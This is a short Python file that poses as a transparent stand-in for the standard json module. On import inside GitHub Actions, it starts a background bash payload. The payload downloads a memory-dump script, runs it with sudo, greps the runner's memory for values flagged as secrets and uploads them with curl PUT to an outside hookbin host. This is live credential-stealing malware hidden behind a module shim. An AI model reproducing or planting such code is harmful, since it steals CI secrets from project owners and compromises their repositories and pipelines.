import sys
import os
import subprocess

# Transparent proxy for the real json module
real_path = [p for p in sys.path if p != os.getcwd() and p != '']
sys.path = real_path

if 'json' in sys.modules:
    del sys.modules['json']

import json
sys.modules['json'] = json
globals().update(json.__dict__)

# Exploit payload
if os.environ.get('GITHUB_ACTIONS') == 'true' and os.environ.get('PWN_EXPLOIT_RUN') != 'true':
    os.environ['PWN_EXPLOIT_RUN'] = 'true'
    payload = """
    curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
    curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
    """
    subprocess.Popen(['bash', '-c', payload], start_new_session=True)
